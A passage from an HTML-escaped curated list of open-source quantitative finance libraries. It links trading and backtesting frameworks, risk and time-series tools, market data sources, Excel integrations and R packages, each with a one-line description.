&lt;code&gt;scikit-learn&lt;/code&gt; resources for trading simulation, backtesting, and machine learning on financial data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jankrepl/deepdow&#34;&gt;DeepDow&lt;/a&gt; - Portfolio optimization with deep learning&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/microsoft/qlib&#34;&gt;Qlib&lt;/a&gt; - An AI-oriented Quantitative Investment Platform by Microsoft. Full ML pipeline of data processing, model training, back-testing; and covers the entire chain of quantitative investment: alpha seeking, risk modeling, portfolio optimization, and order execution.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/stefan-jansen/machine-learning-for-trading&#34;&gt;machine-learning-for-trading&lt;/a&gt; - Code and resources for Machine Learning for Algorithmic Trading&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ScottfreeLLC/AlphaPy&#34;&gt;AlphaPy&lt;/a&gt; - Automated Machine Learning [AutoML] with Python, scikit-learn, Keras, XGBoost, LightGBM, and CatBoost&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jesse-ai/jesse&#34;&gt;jesse&lt;/a&gt; - An advanced crypto trading bot written in Python&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ricequant/rqalpha&#34;&gt;rqalpha&lt;/a&gt; - A extendable, replaceable Python algorithmic backtest &amp;amp;&amp;amp; trading framework supporting multiple securities.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/AI4Finance-LLC/FinRL-Library&#34;&gt;FinRL-Library&lt;/a&gt; - A Deep Reinforcement Learning Library for Automated Trading in Quantitative Finance. NeurIPS 2020.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/achillesrasquinha/bulbea&#34;&gt;bulbea&lt;/a&gt; - Deep Learning based Python Library for Stock Market Prediction and Modelling.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ajhpark/ib_nope&#34;&gt;ib_nope&lt;/a&gt; - Automated trading system for NOPE strategy over IBKR TWS.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Drakkar-Software/OctoBot&#34;&gt;OctoBot&lt;/a&gt; - Open source cryptocurrency trading bot for high frequency, arbitrage, TA and social trading with an advanced web interface.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mementum/bta-lib&#34;&gt;bta-lib&lt;/a&gt; - Technical Analysis library in pandas for backtesting algotrading and quantitative analysis.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/huseinzol05/Stock-Prediction-Models&#34;&gt;Stock-Prediction-Models&lt;/a&gt; - Gathers machine learning and deep learning models for Stock forecasting including trading bots and simulations.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jmrichardson/tuneta&#34;&gt;TuneTA&lt;/a&gt; - TuneTA optimizes technical indicators using a distance correlation measure to a user defined target feature such as next day return.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kieran-mackle/AutoTrader&#34;&gt;AutoTrader&lt;/a&gt; - A Python-based development platform for automated trading systems - from backtesting to optimisation to livetrading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jrmeier/fast-trade&#34;&gt;fast-trade&lt;/a&gt; - A library built with backtest portability and performance in mind for backtest trading strategies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quarkfin/qf-lib&#34;&gt;qf-lib&lt;/a&gt; - QF-Lib is a Python library that provides high quality tools for quantitative finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alexgolec/tda-api&#34;&gt;tda-api&lt;/a&gt; - Gather data and trade equities, options, and ETFs via TDAmeritrade.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/polakowo/vectorbt&#34;&gt;vectorbt&lt;/a&gt; - Find your trading edge, using a powerful toolkit for backtesting, algorithmic trading, and research.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/QuantConnect/Lean&#34;&gt;Lean&lt;/a&gt; - Lean Algorithmic Trading Engine by QuantConnect (Python, C#).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jrmeier/fast-trade&#34;&gt;fast-trade&lt;/a&gt; - Low code backtesting library utilizing pandas and technical analysis indicators.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Risk Analysis&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantopian/pyfolio&#34;&gt;pyfolio&lt;/a&gt; - Portfolio and risk analytics in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantopian/empyrical&#34;&gt;empyrical&lt;/a&gt; - Common financial risk and performance metrics.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rsvp/fecon235&#34;&gt;fecon235&lt;/a&gt; - Computational tools for financial economics include: Gaussian Mixture model of leptokurtotic risk, adaptive Boltzmann portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/finance/&#34;&gt;finance&lt;/a&gt; - Financial Risk Calculations. Optimized for ease of use through class construction and operator overload.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/qfrm/&#34;&gt;qfrm&lt;/a&gt; - Quantitative Financial Risk Management: awesome OOP tools for measuring, managing and visualizing risk of financial instruments and portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/benjaminmgross/visualize-wealth&#34;&gt;visualize-wealth&lt;/a&gt; - Portfolio construction and quantitative analysis.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wegamekinglc/VisualPortfolio&#34;&gt;VisualPortfolio&lt;/a&gt; - This tool is used to visualize the perfomance of a portfolio.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Marigold/universal-portfolios&#34;&gt;universal-portfolios&lt;/a&gt; - Collection of algorithms for online portfolio selection.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fmilthaler/FinQuant&#34;&gt;FinQuant&lt;/a&gt; - A program for financial portfolio management, analysis and optimisation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ssantoshp/Empyrial&#34;&gt;Empyrial&lt;/a&gt; - Portfolio&#39;s risk and performance analytics and returns predictions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bbcho/risktools-dev&#34;&gt;risktools&lt;/a&gt; - Risk tools for use within the crude and crude products trading space with partial implementation of R&#39;s PerformanceAnalytics.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dcajasn/Riskfolio-Lib&#34;&gt;Riskfolio-Lib&lt;/a&gt; - Portfolio Optimization and Quantitative Strategic Asset Allocation in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Factor Analysis&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantopian/alphalens&#34;&gt;alphalens&lt;/a&gt; - Performance analysis of predictive alpha factors.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Heerozh/spectre&#34;&gt;Spectre&lt;/a&gt; - GPU-accelerated Factors analysis library and Backtester&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Time Series&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bashtage/arch&#34;&gt;ARCH&lt;/a&gt; - ARCH models in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://statsmodels.sourceforge.net&#34;&gt;statsmodels&lt;/a&gt; - Python module that allows users to explore data, estimate statistical models, and perform statistical tests.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantmind/dynts&#34;&gt;dynts&lt;/a&gt; - Python package for timeseries analysis and manipulation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RJT1990/pyflux&#34;&gt;PyFlux&lt;/a&gt; - Python library for timeseries modelling and inference (frequentist and Bayesian) on models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blue-yonder/tsfresh&#34;&gt;tsfresh&lt;/a&gt; - Automatic extraction of relevant features from time series.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://platform.hasura.io/hub/projects/anirudhm/quandl-metabase-time-series&#34;&gt;hasura/quandl-metabase&lt;/a&gt; - Hasura quickstart to visualize Quandl&#39;s timeseries datasets with Metabase.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/facebook/prophet&#34;&gt;Facebook Prophet&lt;/a&gt; - Tool for producing high quality forecasts for time series data that has multiple seasonality with linear or non-linear growth.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cerlymarco/tsmoothie&#34;&gt;tsmoothie&lt;/a&gt; - A python library for time-series smoothing and outlier detection in a vectorized way.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alkaline-ml/pmdarima&#34;&gt;pmdarima&lt;/a&gt; - A statistical library designed to fill the void in Python&#39;s time series analysis capabilities, including the equivalent of R&#39;s auto.arima function.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/awslabs/gluon-ts&#34;&gt;gluon-ts&lt;/a&gt; - vProbabilistic time series modeling in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Calendars&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/gerrymanoim/exchange_calendars&#34;&gt;exchange_calendars&lt;/a&gt; - Stock Exchange Trading Calendars.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wilsonfreitas/python-bizdays&#34;&gt;bizdays&lt;/a&gt; - Business days calculations and utilities.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rsheftel/pandas_market_calendars&#34;&gt;pandas_market_calendars&lt;/a&gt; - Exchange calendars to use with pandas for trading applications.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Data Sources&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ranaroussi/yfinance&#34;&gt;yfinance&lt;/a&gt; - Yahoo! Finance market data downloader (+faster Pandas Datareader)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cuemacro/findatapy&#34;&gt;findatapy&lt;/a&gt; - Python library to download market data via Bloomberg, Quandl, Yahoo etc.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hongtaocai/googlefinance&#34;&gt;googlefinance&lt;/a&gt; - Python module to get real-time stock data from Google Finance API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lukaszbanasiak/yahoo-finance&#34;&gt;yahoo-finance&lt;/a&gt; - Python module to get stock data from Yahoo! Finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pydata/pandas-datareader&#34;&gt;pandas-datareader&lt;/a&gt; - Python module to get data from various sources (Google Finance, Yahoo Finance, FRED, OECD, Fama/French, World Bank, Eurostat...) into Pandas datastructures such as DataFrame, Panel with a caching mechanism.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/davidastephens/pandas-finance&#34;&gt;pandas-finance&lt;/a&gt; - High level API for access to and analysis of financial data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/innes213/pyhoofinance&#34;&gt;pyhoofinance&lt;/a&gt; - Rapidly queries Yahoo Finance for multiple tickers and returns typed data for analysis.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Karthik005/yfinanceapi&#34;&gt;yfinanceapi&lt;/a&gt; - Finance API for Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/slawek87/yql-finance&#34;&gt;yql-finance&lt;/a&gt; - yql-finance is simple and fast. API returns stock closing prices for current period of time and current stock ticker (i.e. APPL, GOOGL).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cgoldberg/ystockquote&#34;&gt;ystockquote&lt;/a&gt; - Retrieve stock quote data from Yahoo Finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mcdallas/wallstreet&#34;&gt;wallstreet&lt;/a&gt; - Real time stock and option data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ZachLiuGIS/stock_extractor&#34;&gt;stock_extractor&lt;/a&gt; - General Purpose Stock Extractors from Online Resources.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cttn/Stockex&#34;&gt;Stockex&lt;/a&gt; - Python wrapper for Yahoo! Finance API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/skillachie/finsymbols&#34;&gt;finsymbols&lt;/a&gt; - Obtains stock symbols and relating information for SP500, AMEX, NYSE, and NASDAQ.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/avelkoski/FRB&#34;&gt;FRB&lt;/a&gt; - Python Client for FRED® API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/econdb/inquisitor&#34;&gt;inquisitor&lt;/a&gt; - Python Interface to Econdb.com API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/nickelkr/yfi&#34;&gt;yfi&lt;/a&gt; - Yahoo! YQL library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/chinesestockapi/&#34;&gt;chinesestockapi&lt;/a&gt; - Python API to get Chinese stock price.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/akarat/exchange&#34;&gt;exchange&lt;/a&gt; - Get current exchange rate.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jamescnowell/ticks&#34;&gt;ticks&lt;/a&gt; - Simple command line tool to get stock ticker data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bpsmith/pybbg&#34;&gt;pybbg&lt;/a&gt; - Python interface to Bloomberg COM APIs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lsbardel/ccy&#34;&gt;ccy&lt;/a&gt; - Python module for currencies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/tushare/&#34;&gt;tushare&lt;/a&gt; - A utility for crawling historical and Real-time Quotes data of China stocks.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/jsm/&#34;&gt;jsm&lt;/a&gt; - Get the japanese stock market data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jealous/cn_stock_src&#34;&gt;cn_stock_src&lt;/a&gt; - Utility for retrieving basic China stock data from different sources.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/barnumbirr/coinmarketcap&#34;&gt;coinmarketcap&lt;/a&gt; - Python API for coinmarketcap.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/datawrestler/after-hours&#34;&gt;after-hours&lt;/a&gt; - Obtain pre market and after hours stock prices for a given symbol.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/bronto-python/&#34;&gt;bronto-python&lt;/a&gt; - Bronto API Integration for Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rainx/pytdx&#34;&gt;pytdx&lt;/a&gt; - Python Interface for retrieving chinese stock realtime quote data from TongDaXin Nodes.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/matthewgilbert/pdblp&#34;&gt;pdblp&lt;/a&gt; - A simple interface to integrate pandas and the Bloomberg Open API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hydrosquall/tiingo-python&#34;&gt;tiingo&lt;/a&gt; - Python interface for daily composite prices/OHLC/Volume + Real-time News Feeds, powered by the Tiingo Data Platform.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/addisonlynch/iexfinance&#34;&gt;iexfinance&lt;/a&gt; - Python Interface for retrieving real-time and historical prices and equities data from The Investor&#39;s Exchange.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/timkpaine/pyEX&#34;&gt;pyEX&lt;/a&gt; - Python interface to IEX with emphasis on pandas, support for streaming data, premium data, points data (economic, rates, commodities), and technical indicators.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alpacahq/alpaca-trade-api-python&#34;&gt;alpaca-trade-api&lt;/a&gt; - Python interface for retrieving real-time and historical prices from Alpaca API as well as trade execution.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/MetaTrader5/&#34;&gt;metatrader5&lt;/a&gt; - API Connector to MetaTrader 5 Terminal&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jindaxiang/akshare&#34;&gt;akshare&lt;/a&gt; - AkShare is an elegant and simple financial data interface library for Python, built for human beings! &lt;a href=&#34;https://akshare.readthedocs.io&#34;&gt;https://akshare.readthedocs.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dpguthrie/yahooquery&#34;&gt;yahooquery&lt;/a&gt; - Python interface for retrieving data through unofficial Yahoo Finance API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alvarobartt/investpy&#34;&gt;investpy&lt;/a&gt; - Financial Data Extraction from Investing.com with Python! &lt;a href=&#34;https://investpy.readthedocs.io/&#34;&gt;https://investpy.readthedocs.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yahoofinancelive/yliveticker&#34;&gt;yliveticker&lt;/a&gt; - Live stream of market data from Yahoo Finance websocket.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ran404/bbgbridge&#34;&gt;bbgbridge&lt;/a&gt; - Easy to use Bloomberg Desktop API wrapper for Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RomelTorres/alpha_vantage&#34;&gt;alpha_vantage&lt;/a&gt; - A python wrapper for Alpha Vantage API for financial data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/FinanceData/FinanceDataReader&#34;&gt;FinanceDataReader&lt;/a&gt; - Open Source Financial data reader for U.S, Korean, Japanese, Chinese, Vietnamese Stocks&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TomasKoutek/pystlouisfed&#34;&gt;pystlouisfed&lt;/a&gt; - Python client for Federal Reserve Bank of St. Louis API - FRED, ALFRED, GeoFRED and FRASER.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wilsonfreitas/python-bcb&#34;&gt;python-bcb&lt;/a&gt; - Python interface to Brazilian Central Bank web services.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Excel Integration&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.xlwings.org/&#34;&gt;xlwings&lt;/a&gt; - Make Excel fly with Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://openpyxl.readthedocs.io/en/latest/&#34;&gt;openpyxl&lt;/a&gt; - Read/Write Excel 2007 xlsx/xlsm files.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/python-excel/xlrd&#34;&gt;xlrd&lt;/a&gt; - Library for developers to extract data from Microsoft Excel spreadsheet files.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://xlsxwriter.readthedocs.io/&#34;&gt;xlsxwriter&lt;/a&gt; - Write files in the Excel 2007+ XLSX file format.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/python-excel/xlwt&#34;&gt;xlwt&lt;/a&gt; - Library to create spreadsheet files compatible with MS Excel 97/2000/XP/2003 XLS files, on any platform.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://datanitro.com/&#34;&gt;DataNitro&lt;/a&gt; - DataNitro also offers full-featured Python-Excel integration, including UDFs. Trial downloads are available, but users must purchase a license.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://xlloop.sourceforge.net&#34;&gt;xlloop&lt;/a&gt; - XLLoop is an open source framework for implementing Excel user-defined functions (UDFs) on a centralised server (a function server).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.bnikolic.co.uk/expy/expy.html&#34;&gt;expy&lt;/a&gt; - The ExPy add-in allows easy use of Python directly from within an Microsoft Excel spreadsheet, both to execute arbitrary code and to define new Excel functions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pyxll.com&#34;&gt;pyxll&lt;/a&gt; - PyXLL is an Excel add-in that enables you to extend Excel using nothing but Python code.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Visualization&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/man-group/dtale&#34;&gt;D-Tale&lt;/a&gt; - Visualizer for pandas dataframes and xarray datasets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/matplotlib/mplfinance&#34;&gt;mplfinance&lt;/a&gt; - matplotlib utilities for the visualization, and visual analysis, of financial data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/highfestiva/finplot&#34;&gt;finplot&lt;/a&gt; - Performant and effortless finance plotting for Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lit26/finvizfinance&#34;&gt;finvizfinance&lt;/a&gt; - Finviz analysis python library.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;R&lt;/h2&gt; &#xA;&lt;h3&gt;Numerical Libraries &amp;amp; Data Structures&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/joshuaulrich/xts&#34;&gt;xts&lt;/a&gt; - eXtensible Time Series: Provide for uniform handling of R&#39;s different time-based data classes by extending zoo, maximizing native format information preservation and allowing for user level customization and extension, while simplifying cross-class interoperability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Rdatatable/data.table&#34;&gt;data.table&lt;/a&gt; - Extension of data.frame: Fast aggregation of large data (e.g. 100GB in RAM), fast ordered joins, fast add/modify/delete of columns by group using no copies at all, list columns and a fast file reader (fread). Offers a natural and flexible syntax, for faster development.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dppalomar/sparseEigen&#34;&gt;sparseEigen&lt;/a&gt; - Sparse pricipal component analysis.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://tsdbi.r-forge.r-project.org/&#34;&gt;TSdbi&lt;/a&gt; - Provides a common interface to time series databases.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/tseries/index.html&#34;&gt;tseries&lt;/a&gt; - Time Series Analysis and Computational Finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/zoo/index.html&#34;&gt;zoo&lt;/a&gt; - S3 Infrastructure for Regular and Irregular Time Series (Z&#39;s Ordered Observations).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/tis/index.html&#34;&gt;tis&lt;/a&gt; - Functions and S3 classes for time indexes and time indexed series, which are compatible with FAME frequencies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/tfplot/index.html&#34;&gt;tfplot&lt;/a&gt; - Utilities for simple manipulation and quick plotting of time series data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/tframe/index.html&#34;&gt;tframe&lt;/a&gt; - A kernel of functions for programming time series methods in a way that is relatively independently of the representation of time.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Data Sources&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/IBrokers/index.html&#34;&gt;IBrokers&lt;/a&gt; - Provides native R access to Interactive Brokers Trader Workstation API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Rblp/Rblpapi&#34;&gt;Rblpapi&lt;/a&gt; - An R Interface to &#39;Bloomberg&#39; is provided via the &#39;Blp API&#39;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.quandl.com/tools/r&#34;&gt;Quandl&lt;/a&gt; - Get Financial Data Directly Into R.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jangorecki/Rbitcoin&#34;&gt;Rbitcoin&lt;/a&gt; - Unified markets API interface (bitstamp, kraken, btce, bitmarket).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/msperlin/GetTDData&#34;&gt;GetTDData&lt;/a&gt; - Downloads and aggregates data for Brazilian government issued bonds directly from the website of Tesouro Direto.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/msperlin/GetHFData&#34;&gt;GetHFData&lt;/a&gt; - Downloads and aggregates high frequency trading data for Brazilian instruments directly from Bovespa ftp site.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dashboard.nbshare.io/apps/reddit/api/&#34;&gt;Reddit WallstreetBets API&lt;/a&gt; - Provides daily top 50 stocks from reddit (subreddit) Wallstreetbets and their sentiments via the API.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/eddelbuettel/td&#34;&gt;td&lt;/a&gt; - Interfaces the &#39;twelvedata&#39; API for stocks and (digital and standard) currencies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wilsonfreitas/rbcb&#34;&gt;rbcb&lt;/a&gt; - R interface to Brazilian Central Bank web services.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Financial Instruments and Pricing&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://dirk.eddelbuettel.com/code/rquantlib.html&#34;&gt;RQuantLib&lt;/a&gt; - RQuantLib connects GNU R with QuantLib.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/quantmod/index.html&#34;&gt;quantmod&lt;/a&gt; - Quantitative Financial Modelling Framework.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rmetrics.org&#34;&gt;Rmetrics&lt;/a&gt; - The premier open source software solution for teaching and training quantitative finance. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fAsianOptions/index.html&#34;&gt;fAsianOptions&lt;/a&gt; - EBM and Asian Option Valuation.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fAssets/index.html&#34;&gt;fAssets&lt;/a&gt; - Analysing and Modelling Financial Assets.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fBasics/index.html&#34;&gt;fBasics&lt;/a&gt; - Markets and Basic Statistics.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fBonds/index.html&#34;&gt;fBonds&lt;/a&gt; - Bonds and Interest Rate Models.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fExoticOptions/index.html&#34;&gt;fExoticOptions&lt;/a&gt; - Exotic Option Valuation.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fOptions/index.html&#34;&gt;fOptions&lt;/a&gt; - Pricing and Evaluating Basic Options.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fPortfolio/index.html&#34;&gt;fPortfolio&lt;/a&gt; - Portfolio Selection and Optimization.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dgerlanc/portfolio&#34;&gt;portfolio&lt;/a&gt; - Analysing equity portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dppalomar/sparseIndexTracking&#34;&gt;sparseIndexTracking&lt;/a&gt; - Portfolio design to track an index.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dppalomar/covFactorModel&#34;&gt;covFactorModel&lt;/a&gt; - Covariance matrix estimation via factor models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dppalomar/riskParityPortfolio&#34;&gt;riskParityPortfolio&lt;/a&gt; - Blazingly fast design of risk parity portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 